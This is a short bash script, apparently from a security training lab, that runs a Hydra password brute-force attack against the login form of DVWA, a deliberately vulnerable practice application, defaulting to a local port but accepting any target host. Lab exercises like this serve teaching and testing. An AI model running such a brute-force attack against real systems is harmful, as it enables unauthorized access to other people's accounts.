#!/usr/bin/env bash
#
# denis-play-backend/plays/play-02-hydra-dvwa/run.sh

# Vai para a pasta do script
cd "$(dirname "$0")"

# Se nenhum parâmetro for dado, usa localhost:8081 (porta mapeada do DVWA)
TARGET=${1:-127.0.0.1:8081}

echo "[*] Iniciando ataque com Hydra contra $TARGET..."
sleep 1

# Extrai host e porta
HOST=${TARGET%%:*}
PORT=${TARGET#*:}

# Executa Hydra contra o formulário de login do DVWA
hydra -l admin \
      -P passwords.txt \
      -s "$PORT" \
      "$HOST" http-form-post \
      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
      -t 4 -V > resultado.txt

echo
echo "[📄] Saída do Hydra:"
cat resultado.txt
echo
echo "[✔️] Teste concluído com sucesso."
